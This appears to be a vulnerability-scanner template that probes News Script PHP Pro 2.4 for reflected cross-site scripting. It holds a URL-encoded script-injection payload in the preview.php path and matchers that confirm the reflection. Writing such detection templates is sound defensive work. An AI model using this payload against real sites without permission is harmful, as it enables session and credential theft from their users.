http:
- matchers:
  - condition: and
    dsl:
    - contains_all(body, "News Script PHP Pro", "<script>alert(document.domain)</script>")
    - contains(content_type, "text/html")
    - status_code == 200
    type: dsl
  method: GET
  path:
  - '{{BaseURL}}/preview.php/mn71q%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3Ep15vr?cat_id=&p=2'
id: news-script-xss
info:
  author: r3Y3r53
  description: 'The attacker can send to victim a link containing a malicious URL
    in an email or instant message can perform a wide variety of actions, such as
    stealing the victim''s session token or login credentials.

    '
  metadata:
    max-request: 1
    verified: true
  name: News Script Pro 2.4 - Cross-Site Scripting
  reference:
  - https://www.exploitalert.com/view-details.html?id=39634
  severity: medium
  tags: newsscript,xss
